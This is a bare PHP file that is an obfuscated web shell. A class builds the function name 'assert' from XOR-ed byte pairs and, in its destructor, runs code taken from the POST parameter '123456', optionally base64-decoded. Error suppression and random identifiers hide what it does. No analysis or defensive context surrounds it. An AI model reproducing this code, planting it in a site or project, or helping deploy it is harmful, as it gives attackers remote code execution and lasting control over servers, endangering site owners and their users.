<?php 
class ZMNJ { 
    function FdbM() {
        $YbRB = "\x89" ^ "\xe8";
        $TuLB = "\xed" ^ "\x9e";
        $dPrY = "\x10" ^ "\x63";
        $gdoO = "\xa" ^ "\x6f";
        $kqaL = "\x82" ^ "\xf0";
        $dgSx = "\x41" ^ "\x35";
        $Bpvv =$YbRB.$TuLB.$dPrY.$gdoO.$kqaL.$dgSx;
        return $Bpvv;
    }
    function __destruct(){
        $NctE=$this->FdbM();
        @$NctE($this->mq);
    }
}
$zmnj = new ZMNJ();
@$zmnj->mq = isset($_GET['id'])?base64_decode($_POST['123456']):$_POST['123456'];
?>